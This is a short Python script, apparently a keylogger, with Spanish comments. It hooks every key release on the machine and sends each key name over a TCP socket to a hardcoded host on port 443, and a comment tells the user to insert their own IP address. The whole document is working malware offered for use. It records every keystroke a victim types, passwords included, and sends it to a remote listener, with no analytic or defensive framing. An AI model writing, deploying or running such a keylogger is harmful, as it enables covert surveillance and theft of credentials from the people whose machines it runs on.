#!/usr/bin/env python3

import keyboard
import socket
import sys
import signal

# Colocar tu IP aquí
host = '192.168.1.64'
port = 443

try:
    s = socket.socket()
    s.connect((host, port))
except:
    print("\n[!] Se ha acontecido un error en la conexión\n")
    sys.exit(1)

def on_key_event(event):
    if event.event_type == keyboard.KEY_UP:
        s.send(f"'{event.name}'".encode())

keyboard.hook(on_key_event)
keyboard.wait()
